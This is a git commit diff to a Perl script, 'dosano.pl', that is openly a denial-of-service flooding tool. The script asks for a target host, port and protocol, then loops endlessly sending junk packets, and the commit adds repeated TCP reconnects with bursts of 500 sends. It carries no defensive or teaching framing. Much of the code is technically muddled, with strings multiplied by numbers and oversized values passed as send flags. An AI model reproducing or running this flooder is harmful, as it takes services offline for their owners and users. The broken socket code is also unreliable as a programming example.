298005b7eb8acca4ccd85e55c9eab2be006ecc31
root <root@localhost.localdomain>
2019-01-30 23:32:10 +0000

    Update&Fix

--- dosano.pl
+++ dosano.pl
@@ -10,7 +10,6 @@ use Scalar::Util qw(looks_like_number);
 
 #=== Clear Screen ===#
 system("cls || clear");
-
 #Script Banner================================================================
 print q{ 
                    .-"      "-.  
@@ -72,7 +71,6 @@ while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
 print "Protocol ==> $proto";
 print "\n===============================\n";
 sleep(1);
-# Create The Socket
 $sock = IO::Socket::INET->new(
         PeerAddr => $host,
         PeerPort => $port,
@@ -81,15 +79,32 @@ system("clear || cls");
 print "\n[*] Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
 sleep(1);
 while (1) {
-  $size = rand() * 8921873 * 99919988;
-  print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
-  send($sock, $size*2, $size*2); 
-  send($sock, $size*3, $size*3);
-  send($sock, $size*4, $size*4);
-  send($sock, $size*9999999999999,$size*9999999999999);
-  send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*3)
-}
+  if(grep{$proto eq $_} 'TCP','tcp'){
+       $sock = IO::Socket::INET->new(
+        PeerAddr => $host,
+        PeerPort => $port,
+        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
+       for($i=0; $i<=500; $i++){
+            $size = rand() * 8921873 * 99919988;
+            print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
+            send($sock, $size*2, $size*2); 
+            send($sock, $size*3, $size*3);
+            send($sock, $size*4, $size*4);
+            send($sock, $size*9999999999999,$size*9999999999999);
+            send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@asasf#@#%23%235543wewreqwr#@523sdfsa"*3);
+      }
 
+  }else{
+            $size = rand() * 8921873 * 99919988;
+            print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
+            send($sock, $size*2, $size*2); 
+            send($sock, $size*3, $size*3);
+            send($sock, $size*4, $size*4);
+            send($sock, $size*9999999999999,$size*9999999999999);
+            send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@asasf#@#%23%235543wewreqwr#@523sdfsa"*3);
+ }
+}
+$sock->close()
 ##############################################################
 #####################                #########################
 #####################  END OF SCRIPT #########################
